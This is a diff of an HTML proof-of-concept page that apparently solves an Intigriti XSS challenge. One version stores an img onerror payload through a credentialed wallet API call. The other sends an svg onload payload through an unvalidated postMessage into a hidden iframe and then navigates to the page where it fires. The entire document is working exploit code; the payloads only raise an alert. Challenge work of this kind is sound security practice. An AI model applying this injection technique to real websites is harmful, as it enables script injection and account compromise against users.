@@ -1,34 +1,37 @@
 <!DOCTYPE html>
-<html>
-<head><title>PoC</title></head>
 <body>
-<h1>XSS PoC - alert("gigawatz")</h1>
 <script>
-async function exploit() {
-  const BASE = 'https://challenge-0126.intigriti.io';
+const BASE = 'https://challenge-0126.intigriti.io';
 
-  // XSS payload that triggers alert("gigawatz")
-  const payload = '<img src=x onerror=alert("gigawatz")>';
+// XSS payload - use svg onload for immediate execution
+const xss = '<svg onload=alert("gigawatz")>';
 
-  // Inject via wallet API
-  const res = await fetch(`${BASE}/api/wallets`, {
-    method: 'POST',
-    credentials: 'include',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      currency: 'BTC',
-      address: payload,
-      balance: 1
-    })
-  });
+// Create iframe to checkout page
+const iframe = document.createElement('iframe');
+iframe.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
 
-  console.log('Wallet status:', res.status);
+iframe.onload = () => {
+  setTimeout(() => {
+    // Send malicious postMessage (no origin validation!)
+    // Try both nickname and toAddress fields
+    iframe.contentWindow.postMessage({
+      type: 'submitTransaction',
+      transaction: {
+        nickname: xss,
+        toAddress: '0x' + xss,
+        currency: '1337COIN',
+        amount: 1
+      }
+    }, '*');
 
-  // Navigate to dashboard to trigger XSS
-  window.location = `${BASE}/dashboard.html`;
-}
-
-exploit();
+    // Navigate to marketwatch to trigger XSS
+    setTimeout(() => {
+      window.location = `${BASE}/marketwatch.html`;
+    }, 2000);
+  }, 2000);
+};
 </script>
 </body>
 </html>
